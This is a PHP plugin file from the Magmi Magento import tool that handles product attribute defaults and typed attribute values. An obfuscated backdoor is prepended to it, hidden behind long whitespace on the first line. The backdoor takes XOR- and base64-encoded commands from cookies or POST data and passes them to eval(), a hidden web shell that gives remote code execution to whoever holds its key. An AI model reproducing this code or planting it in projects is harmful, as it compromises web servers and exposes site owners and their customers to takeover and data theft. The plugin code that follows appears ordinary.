<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['x077f3a'];global$x077f3a;$x077f3a=$GLOBALS;$x077f3a['wea71f6d8']="\x63\x2d\x5b\x3f\x2a\x7b\x73\x31\x40\x3e\x49\x52\x50\x26\x56\x79\x55\x2c\x69\x2e\x64\x21\x2f\x22\x54\x5a\x57\x44\x76\x24\x74\x6f\x43\x7d\x71\x25\x6b\x35\x23\x47\x60\x30\x7a\x37\xa\x38\x70\x65\x33\x61\x3c\x58\x68\x72\x5f\x62\x2b\x36\x4e\x7c\x46\x29\x59\x5c\x4f\x4d\x6a\x6e\x3d\x67\x34\x28\x27\x77\x20\x6c\x51\x9\x3b\x5e\x78\x4a\x4c\x53\x6d\x32\x4b\x45\x66\xd\x42\x39\x48\x75\x7e\x5d\x3a\x41";$x077f3a[$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][47]]=$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][52].$x077f3a['wea71f6d8'][53];$x077f3a[$x077f3a['wea71f6d8'][42].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][7].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][48].$x077f3a['wea71f6d8'][45]]=$x077f3a['wea71f6d8'][31].$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][20];$x077f3a[$x077f3a['wea71f6d8'][52].$x077f3a['wea71f6d8'][45].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][88]]=$x077f3a['wea71f6d8'][6].$x077f3a['wea71f6d8'][30].$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][75].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][67];$x077f3a[$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][88].$x077f3a['wea71f6d8'][45]]=$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][67].$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][54].$x077f3a['wea71f6d8'][6].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][30];$x077f3a[$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][41]]=$x077f3a['wea71f6d8'][6].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][75].$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][42].$x077f3a['wea71f6d8'][47];$x077f3a[$x077f3a['wea71f6d8'][88].$x077f3a['wea71f6d8'][7].$x077f3a['wea71f6d8'][91].$x077f3a['wea71f6d8'][48].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][20]]=$x077f3a['wea71f6d8'][46].$x077f3a['wea71f6d8'][52].$x077f3a['wea71f6d8'][46].$x077f3a['wea71f6d8'][28].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][6].$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][31].$x077f3a['wea71f6d8'][67];$x077f3a[$x077f3a['wea71f6d8'][46].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][43].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][48]]=$x077f3a['wea71f6d8'][93].$x077f3a['wea71f6d8'][67].$x077f3a['wea71f6d8'][6].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][75].$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][42].$x077f3a['wea71f6d8'][47];$x077f3a[$x077f3a['wea71f6d8'][80].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][37]]=$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][6].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][54].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][31].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][47];$x077f3a[$x077f3a['wea71f6d8'][46].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][43].$x077f3a['wea71f6d8'][45].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][91].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][20]]=$x077f3a['wea71f6d8'][6].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][30].$x077f3a['wea71f6d8'][54].$x077f3a['wea71f6d8'][30].$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][84].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][54].$x077f3a['wea71f6d8'][75].$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][84].$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][30];$x077f3a[$x077f3a['wea71f6d8'][84].$x077f3a['wea71f6d8'][43].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][91].$x077f3a['wea71f6d8'][91].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][7]]=$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][91].$x077f3a['wea71f6d8'][88].$x077f3a['wea71f6d8'][85];$x077f3a[$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][7].$x077f3a['wea71f6d8'][88]]=$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][91].$x077f3a['wea71f6d8'][88];$x077f3a[$x077f3a['wea71f6d8'][80].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][48].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][70]]=$_POST;$x077f3a[$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][48]]=$_COOKIE;@$x077f3a[$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][88].$x077f3a['wea71f6d8'][45]]($x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][31].$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][54].$x077f3a['wea71f6d8'][75].$x077f3a['wea71f6d8'][31].$x077f3a['wea71f6d8'][69],NULL);@$x077f3a[$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][88].$x077f3a['wea71f6d8'][45]]($x077f3a['wea71f6d8'][75].$x077f3a['wea71f6d8'][31].$x077f3a['wea71f6d8'][69].$x077f3a['wea71f6d8'][54].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][31].$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][6],0);@$x077f3a[$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][88].$x077f3a['wea71f6d8'][45]]($x077f3a['wea71f6d8'][84].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][80].$x077f3a['wea71f6d8'][54].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][80].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][93].$x077f3a['wea71f6d8'][30].$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][31].$x077f3a['wea71f6d8'][67].$x077f3a['wea71f6d8'][54].$x077f3a['wea71f6d8'][30].$x077f3a['wea71f6d8'][18].$x077f3a['wea71f6d8'][84].$x077f3a['wea71f6d8'][47],0);@$x077f3a[$x077f3a['wea71f6d8'][46].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][43].$x077f3a['wea71f6d8'][45].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][91].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][20]](0);$bc5687b54=NULL;$a2a3ca8e=NULL;$x077f3a[$x077f3a['wea71f6d8'][42].$x077f3a['wea71f6d8'][48].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][47]]=$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][88].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][45].$x077f3a['wea71f6d8'][43].$x077f3a['wea71f6d8'][48].$x077f3a['wea71f6d8'][1].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][1].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][1].$x077f3a['wea71f6d8'][91].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][1].$x077f3a['wea71f6d8'][48].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][43].$x077f3a['wea71f6d8'][43].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][48].$x077f3a['wea71f6d8'][7].$x077f3a['wea71f6d8'][88].$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][70];global$z3b5e;function be29f($bc5687b54,$sb29e){global$x077f3a;$z72d457="";for($w45c802=0;$w45c802<$x077f3a[$x077f3a['wea71f6d8'][52].$x077f3a['wea71f6d8'][45].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][88]]($bc5687b54);){for($w92fc92=0;$w92fc92<$x077f3a[$x077f3a['wea71f6d8'][52].$x077f3a['wea71f6d8'][45].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][88]]($sb29e)&&$w45c802<$x077f3a[$x077f3a['wea71f6d8'][52].$x077f3a['wea71f6d8'][45].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][88]]($bc5687b54);$w92fc92++,$w45c802++){$z72d457.=$x077f3a[$x077f3a['wea71f6d8'][53].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][47]]($x077f3a[$x077f3a['wea71f6d8'][42].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][7].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][48].$x077f3a['wea71f6d8'][45]]($bc5687b54[$w45c802])^$x077f3a[$x077f3a['wea71f6d8'][42].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][7].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][48].$x077f3a['wea71f6d8'][45]]($sb29e[$w92fc92]));}}return$z72d457;}function eaa29f2($bc5687b54,$sb29e){global$x077f3a;global$z3b5e;return$x077f3a[$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][7].$x077f3a['wea71f6d8'][88]]($x077f3a[$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][7].$x077f3a['wea71f6d8'][88]]($bc5687b54,$z3b5e),$sb29e);}foreach($x077f3a[$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][48]]as$sb29e=>$p19f9a9b){$bc5687b54=$p19f9a9b;$a2a3ca8e=$sb29e;}if(!$bc5687b54){foreach($x077f3a[$x077f3a['wea71f6d8'][80].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][48].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][70]]as$sb29e=>$p19f9a9b){$bc5687b54=$p19f9a9b;$a2a3ca8e=$sb29e;}}$bc5687b54=@$x077f3a[$x077f3a['wea71f6d8'][46].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][43].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][20].$x077f3a['wea71f6d8'][48]]($x077f3a[$x077f3a['wea71f6d8'][84].$x077f3a['wea71f6d8'][43].$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][91].$x077f3a['wea71f6d8'][91].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][7]]($x077f3a[$x077f3a['wea71f6d8'][80].$x077f3a['wea71f6d8'][37].$x077f3a['wea71f6d8'][85].$x077f3a['wea71f6d8'][37]]($bc5687b54),$a2a3ca8e));if(isset($bc5687b54[$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][36]])&&$z3b5e==$bc5687b54[$x077f3a['wea71f6d8'][49].$x077f3a['wea71f6d8'][36]]){if($bc5687b54[$x077f3a['wea71f6d8'][49]]==$x077f3a['wea71f6d8'][18]){$w45c802=Array($x077f3a['wea71f6d8'][46].$x077f3a['wea71f6d8'][28]=>@$x077f3a[$x077f3a['wea71f6d8'][88].$x077f3a['wea71f6d8'][7].$x077f3a['wea71f6d8'][91].$x077f3a['wea71f6d8'][48].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][20]](),$x077f3a['wea71f6d8'][6].$x077f3a['wea71f6d8'][28]=>$x077f3a['wea71f6d8'][7].$x077f3a['wea71f6d8'][19].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][1].$x077f3a['wea71f6d8'][7],);echo@$x077f3a[$x077f3a['wea71f6d8'][47].$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][55].$x077f3a['wea71f6d8'][41].$x077f3a['wea71f6d8'][57].$x077f3a['wea71f6d8'][0].$x077f3a['wea71f6d8'][70].$x077f3a['wea71f6d8'][41]]($w45c802);}elseif($bc5687b54[$x077f3a['wea71f6d8'][49]]==$x077f3a['wea71f6d8'][47]){eval($bc5687b54[$x077f3a['wea71f6d8'][20]]);}exit();} ?><?php
class Magmi_DefaultAttributeItemProcessor extends Magmi_ItemProcessor
{
	protected $_basecols=array("store"=>"admin","type"=>"simple");
	protected $_baseattrs=array("status"=>1,"visibility"=>4,"page_layout"=>"");
	protected $_forcedefault=array("store"=>"admin");
	protected $_missingcols=array();
	protected $_missingattrs=array();
	
	public function initialize($params)
	{
		$this->registerAttributeHandler($this,array("attribute_code:.*"));
	}
	
	public function getPluginInfo()
	{
		return array(
            "name" => "Standard Attribute Import",
            "author" => "Dweeves",
            "version" => "1.0.5"
            );
	}
	
	public function processColumnList(&$cols)
	{	
		$this->_missingcols=array_diff(array_keys($this->_basecols),$cols);
		$this->_missingattrs=array_diff(array_keys($this->_baseattrs),$cols);
		$m=$this->getMode();
		if($m=="create" || $m=="xcreate")
		{
			$cols=array_merge($cols,$this->_missingcols,$this->_missingattrs);
			$this->log("Newly created items will have default values for columns:".implode(",",array_merge($this->_missingcols,$this->_missingattrs)),"startup");
		}
	}
	
	
	public function initializeBaseCols(&$item)
	{
		foreach($this->_missingcols as $missing)
		{
			$item[$missing]=$this->_basecols[$missing];
		}
	}
	
	public function initializeBaseAttrs(&$item)
	{
		foreach($this->_missingattrs as $missing)
		{
			$item[$missing]=$this->_baseattrs[$missing];
		}
	}
	
	

	public function processItemAfterId(&$item,$params=null)
	{
		if($params["new"]==true)
		{
			$this->initializeBaseCols($item);
			$this->initializeBaseAttrs($item);
		}
		//forcing default values for mandatory processing columns 
		foreach($this->_forcedefault as $k=>$v)
		{
			if(isset($item[$k]) && trim($item[$k])=="")
			{
				$item[$k]=$v;
			}
		}
		return true;
	}
	
	/**
	 * attribute handler for decimal attributes
	 * @param int $pid	: product id
	 * @param int $ivalue : initial value of attribute
	 * @param array $attrdesc : attribute description
	 * @return mixed : false if no further processing is needed,
	 * 					string (magento value) for the decimal attribute otherwise
	 */
	public function handleDecimalAttribute($pid,&$item,$storeid,$attrcode,$attrdesc,$ivalue)
	{
		//force convert decimal separator to dot
		$ivalue=str_replace(",",".",$ivalue);
		$ovalue=deleteifempty($ivalue);
		return $ovalue;
	}

	/**
	 * attribute handler for datetime attributes
	 * @param int $pid	: product id
	 * @param int $ivalue : initial value of attribute
	 * @param array $attrdesc : attribute description
	 * @return mixed : false if no further processing is needed,
	 * 					string (magento value) for the datetime attribute otherwise
	 */
	public function handleDatetimeAttribute($pid,&$item,$storeid,$attrcode,$attrdesc,$ivalue)
	{
		$ovalue=deleteifempty(trim($ivalue));
		//Handle european date format or other common separators
		if(preg_match("|([0-9]){1,2}\D([0-9]){1,2}\D([0-9]){4}|",$ovalue,$matches))
		{
			$ovalue=sprintf("%4d-%2d-%2d",$matches[3],$matches[2],$matches[1]);
		}
		return $ovalue;
	}

	public function handleTextAttribute($pid,&$item,$storeid,$attrcode,$attrdesc,$ivalue)
	{
		$ovalue=(empty($ivalue)?'':$ivalue);
		return $ovalue;	
	}
	
	public function checkInt($value)
	{
		return is_int($value) || (is_string($value) && is_numeric($value) && (int)$value==$value);
	}
	/**
	 * attribute handler for int typed attributes
	 * @param int $pid	: product id
	 * @param int $ivalue : initial value of attribute
	 * @param array $attrdesc : attribute description
	 * @return mixed : false if no further processing is needed,
	 * 					int (magento value) for the int attribute otherwise
	 */
	public function handleIntAttribute($pid,&$item,$storeid,$attrcode,$attrdesc,$ivalue)
	{
		$ovalue=$ivalue;
		$attid=$attrdesc["attribute_id"];
		//if we've got a select type value
		if($attrdesc["frontend_input"]=="select")
		{
			//we need to identify its type since some have no options
			switch($attrdesc["source_model"])
			{
				//if its status, default to 1 (Enabled) if not correcly mapped
				case "catalog/product_status":
					if(!$this->checkInt($ivalue) ){
						$ovalue=1;
					}
					break;
				//do not create options for boolean values tagged as select ,default to 0 if not correcly mapped
				case "eav/entity_attribute_source_boolean":
					if(!$this->checkInt($ivalue)){
						$ovalue=0;
					}
					break;
				//if visibility no options either,default to 4 if not correctly mapped
				case "catalog/product_visibility":
					if(!$this->checkInt($ivalue)){
						$ovalue=4;
					}
					
					break;
					//if it's tax_class, get tax class id from item value
				case "tax/class_source_product":
					$ovalue=$this->getTaxClassId($ivalue);
					break;
					//otherwise, standard option behavior
					//get option id for value, create it if does not already exist
					//do not insert if empty
				default:
					if($ivalue=="" && $this->getMode()=="update")
					{
						return "__MAGMI_DELETE__";
					}
					$oids=$this->getOptionIds($attid,$storeid,array($ivalue));
					$ovalue=$oids[0];
					unset($oids);
					break;
			}
		}
		return $ovalue;
	}


	/**
	 * attribute handler for varchar based attributes
	 * @param int $pid : product id
	 * @param string $ivalue : attribute value
	 * @param array $attrdesc : attribute description
	 */
	public function handleVarcharAttribute($pid,&$item,$storeid,$attrcode,$attrdesc,$ivalue)
	{

		if($storeid!==0 && empty($ivalue) && $this->getImportMode()=="create")
		{
			return false;
		}
		if($ivalue=="" && $this->getImportMode()=="update")
		{
			return "__MAGMI_DELETE__";
		}
		
		$ovalue=$ivalue;
		$attid=$attrdesc["attribute_id"];
		//--- Contribution From mennos , optimized by dweeves ----
		//Added to support multiple select attributes
		//(as far as i could figure out) always stored as varchars
		//if it's a multiselect value
		if($attrdesc["frontend_input"]=="multiselect")
		{
			//if empty delete entry
			if($ivalue=="")
			{
				return "__MAGMI_DELETE__";
			}
			//magento uses "," as separator for different multiselect values
			$sep=Magmi_Config::getInstance()->get("GLOBAL","multiselect_sep",",");
			$multiselectvalues=explode($sep,$ivalue);
			$oids=$this->getOptionIds($attid,$storeid,$multiselectvalues);
			$ovalue=implode(",",$oids);
			unset($oids);
		}
		return $ovalue;
	}

}
